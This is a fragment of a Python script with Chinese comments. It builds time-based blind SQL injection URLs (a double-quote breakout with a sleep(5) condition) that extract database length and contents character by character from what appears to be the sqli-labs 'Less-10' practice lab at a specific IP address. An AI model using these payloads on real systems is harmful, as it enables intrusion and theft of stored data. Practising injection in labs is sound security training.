...
data=""
#查数据库长度
url = "http://47.104.232.176:9002/Less-10/?id=1%22 and if((substr(({0}),{1},1)='{2}'),sleep(5),NULL); %23"
#查数据库名
url_length="http://47.104.232.176:9002/Less-10/?id=1%22 and if((length(({0}))={1}),sleep(5),NULL); %23"
#查数据库长度
